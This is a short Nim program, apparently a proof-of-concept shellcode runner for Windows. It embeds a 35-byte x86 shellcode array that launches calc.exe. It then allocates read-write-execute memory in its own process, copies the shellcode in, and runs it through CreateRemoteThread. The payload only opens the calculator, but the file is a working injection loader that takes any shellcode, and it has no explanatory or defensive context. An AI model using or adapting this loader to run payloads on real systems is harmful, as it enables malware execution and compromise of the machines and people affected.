import winim

var shellcode: array[35, byte] = [
byte 0x31, 0xc9, 0x51, 0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c,
    0x63, 0x89, 0xe0, 0x41, 0x51, 0x50, 0xbb, 0xb0, 0x4b, 0x90, 0x76, 0xff,
    0xd3, 0x31, 0xc0, 0x50, 0xb8, 0xb0, 0x6f, 0x8c, 0x76, 0xff, 0xe0


]

let tProcess = GetCurrentProcessId()

var hProcess: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, TRUE, tProcess);

let exec_mem =  VirtualAllocEx(
            hProcess,
            NULL,
            cast[SIZE_T](shellcode.len),
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE
  )
WriteProcessMemory(hProcess, exec_mem, shellcode.addr, cast[SIZE_T](shellcode.len), NULL);
CreateRemoteThread(hProcess, NULL, 0, cast[LPTHREAD_START_ROUTINE](exec_mem), NULL, 0, NULL);
Sleep(1000);
CloseHandle(hProcess)